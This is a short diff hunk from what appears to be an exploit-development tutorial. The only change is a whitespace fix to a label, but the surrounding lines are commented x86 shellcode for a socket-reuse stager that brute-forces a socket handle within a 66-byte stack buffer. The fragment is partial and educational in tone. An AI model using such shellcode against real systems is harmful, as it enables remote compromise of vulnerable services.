@@ -369,7 +369,7 @@ Due to the limited space on the stack we have to work with (66-bytes) we will be
 	sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
 							; overwriting our shellcode
 	xor edi,edi             ; Zero out EDI (Anything XORed with itself is 0)
-	socket_loop:            ; Brute Force Loop Label
+socket_loop:            ; Brute Force Loop Label
 	xor ebx,ebx             ; Zero out EBX (Anything XORed with itself is 0)
 	push ebx                ; Push 'flags' parameter = 0
 	add bh,0x4              ; Make EBX = 0x00000400 which is  1024 bytes
